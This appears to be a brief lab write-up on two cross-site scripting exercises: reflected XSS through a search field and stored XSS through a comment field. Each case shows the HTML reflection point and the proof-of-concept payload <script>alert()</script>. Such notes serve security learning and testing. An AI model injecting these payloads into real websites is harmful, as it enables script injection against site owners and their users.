### 1. Reflected XSS into HTML context with nothing encoded
**Vulnerable Parameter/Location:** Search field<br>
Reflection Point is given below.
```html
<h1>0 search results for '11111'</h1>
```
**Payload Used:** <script>alert()</script>
### 2. Stored XSS into HTML context with nothing encoded
**Vulnerable Parameter/Location:** Comment field<br>
Reflection Point is given below.
```html
<p>11111</p>
```
**Payload Used:** <script>alert()</script>
